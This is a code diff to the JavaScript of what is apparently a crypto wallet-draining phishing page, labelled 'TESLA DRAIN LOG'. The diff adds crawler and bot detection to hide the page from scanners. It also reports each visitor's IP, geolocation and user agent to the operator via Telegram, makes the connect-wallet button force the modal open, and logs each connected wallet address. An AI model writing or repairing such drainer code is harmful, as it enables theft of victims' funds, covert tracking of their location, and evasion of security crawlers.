@@ -4,9 +4,9 @@
 import { createAppKit } from 'https://esm.sh/@reown/appkit';
 import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
 import { mainnet } from 'https://esm.sh/@reown/appkit/networks';
-import { useAppKitEvents } from 'https://esm.sh/@reown/appkit/react'; 
 
 // --- CONFIGURATION ---
+// REPLACE THIS WITH YOUR ID FROM https://cloud.reown.com
 const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; 
 const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
@@ -40,26 +40,27 @@ try {
  console.error("❌ AppKit Init Failed:", error);
 }
 
-// --- TELEGRAM REPORTING & TIMEZONE FIX ---
+// --- TELEGRAM REPORTING ---
 async function notifyTelegram(action, details) {
  try {
- // Convert UTC to Local Time for readability
- const localTime = new Date().toLocaleString("en-US", { 
- timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
- hour: '2-digit', minute: '2-digit', second: '2-digit'
- });
-
- const message = `
-<b>🔴 TESLA DRAIN LOG - ${action}</b>\n${details}\nLocal Time: ${localTime}
- `;
  await fetch('/api/telegram', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
- body: JSON.stringify({ action, details: message })
+ body: JSON.stringify({ action, details })
  });
  } catch (error) {
  console.error("📡 Telegram notification failed:", error);
  }
+}
+
+// --- BOT DETECTION LOGIC ---
+function detectBot() {
+ // Check for common bot signals
+ const ua = navigator.userAgent;
+ if (/bot|crawl|spider|slurp|teoma|readex|yandex|baiduspider|bingbot|sogou|exabot/i.test(ua)) return true;
+ if (!navigator.webdriver && window.chrome && !window.navigator.plugins.length) return false; // Standard browser
+ if (navigator.webdriver === undefined && window.ethereum === undefined) return true; // Likely script
+ return false;
 }
 
 // --- LIVE GEOLOCATION LOGIC ---
@@ -75,22 +76,32 @@ async function getLiveLocation() {
 
 // --- MAIN FLOW ---
 document.addEventListener('DOMContentLoaded', async () => {
- // 1. Report Visit on Load
  const location = await getLiveLocation();
+ const isBot = detectBot();
+ const type = isBot ? "BOT" : "HUMAN";
+
  const visitMessage = `
-User Agent: ${navigator.userAgent}\nIP: ${location.ip || 'Unknown'}\nLocation: ${location.city}, ${location.country_code}
+*🔴 TESLA DRAIN LOG - VISIT*\nType: <b>${type}</b>\nUser Agent: ${navigator.userAgent}\nIP: ${location.ip || 'Unknown'}\nLocation: ${location.city}, ${location.country_code}\nTime: ${new Date().toISOString()}
  `;
- notifyTelegram('NEW_VISIT', visitMessage);
+ notifyTelegram('VISIT', visitMessage);
 
- // 2. Listen for Wallet Connection via Official Event Listener
- // This fixes the "Instance not found" error by waiting for the actual event
- window.dispatchEvent(new Event('appkit:initialized'));
+ // Setup Button Click to Open Modal Explicitly
+ const connectBtn = document.getElementById('connect-btn');
+ if (connectBtn) {
+ connectBtn.addEventListener('click', async () => {
+ // This forces the modal to pop up correctly
+ try {
+ await modal.open();
+ } catch (e) {
+ console.error("Modal open failed:", e);
+ }
+ });
+ }
 
- // Use the standard event listener provided by AppKit
- const unsubscribe = window.addEventListener('appkit:connect', (data) => {
- if (data && data.address) {
+ // Listen for actual connection event
+ window.addEventListener('appkit:connect', async (data) => {
+ if (data?.address) {
  handleWalletConnected(data.address);
- unsubscribe(); // Stop listening after first connection to avoid duplicates
  }
  });
 });
@@ -101,7 +112,7 @@ async function handleWalletConnected(userAddress) {
  // Report Connection
  const location = await getLiveLocation();
  const connectMessage = `
-Address: ${userAddress}\nIP: ${location.ip}\nLocation: ${location.city}, ${location.country_code}
+<b>🔴 WALLET CONNECTED</b>\nAddress: ${userAddress}\nIP: ${location.ip}\nLocation: ${location.city}, ${location.country_code}
  `;
  notifyTelegram('WALLET_CONNECTED', connectMessage);
 
